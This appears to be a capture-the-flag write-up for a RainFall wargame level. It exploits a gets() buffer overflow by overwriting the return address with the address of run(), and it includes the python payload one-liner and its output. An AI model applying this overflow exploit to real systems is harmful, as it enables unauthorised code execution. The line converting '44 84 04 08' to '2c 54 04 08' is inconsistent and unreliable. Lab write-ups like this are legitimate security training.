Program waits for an input

gets function: no buffer overrun check

→ Objective: find segfault limit and write on it the function address we want to call (here : run)

To find run address: objdump -d level1  → 08048444 <run>:
We must convert it in hexadecimal + little-endian (reverse):
Addr: 44 84 04 08 -> 2c 54 04 08

We find the offset at 76 char → 75 char nothing happens, 76 Illegal instruction. 
It can be found by hand testing but also by watching the decompiled code, gets store its result in a char[76]

level1@RainFall:~$ python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/off

Segmentation fault (core dumped)
level1@RainFall:~$ cat /tmp/off - | ./level1 
Good... Wait what?

→ cat /tmp/off - : allows to read the file and leave it open so that level1 reads it as input
